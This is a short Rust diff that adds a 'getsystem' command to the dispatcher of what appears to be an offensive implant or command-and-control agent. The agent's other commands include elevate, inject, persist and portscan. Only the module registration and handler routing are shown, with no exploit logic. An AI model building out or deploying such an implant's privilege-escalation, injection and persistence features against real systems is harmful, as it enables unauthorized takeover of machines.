@@ -13,6 +13,7 @@ mod config;
 mod download;
 pub mod elevate;
 pub mod getprivs;
+mod getsystem;
 mod inject;
 mod persist;
 mod portscan;
@@ -52,6 +53,7 @@ pub enum CommandType {
     Download,
     Elevate,
     Getprivs,
+    Getsystem,
     Inject,
     Portscan,
     Persist,
@@ -174,6 +176,7 @@ impl NotionCommand {
                 "download" => CommandType::Download,
                 "elevate"  => CommandType::Elevate,
                 "getprivs" => CommandType::Getprivs,
+                "getsystem" => CommandType::Getsystem,
                 "inject"   => CommandType::Inject,
                 "persist"  => CommandType::Persist,
                 "portscan" => CommandType::Portscan,
@@ -202,6 +205,7 @@ impl NotionCommand {
             CommandType::Download => download::handle( &mut self.args, logger).await,
             CommandType::Elevate  => elevate::handle(&mut self.args, config_options).await,
             CommandType::Getprivs    => getprivs::handle().await,
+            CommandType::Getsystem    => getsystem::handle(logger).await,
             CommandType::Inject   => inject::handle(&mut self.args, logger).await,
             CommandType::Persist  => persist::handle(&mut self.args, config_options, logger).await,
             CommandType::Portscan => portscan::handle(&mut self.args, logger).await,
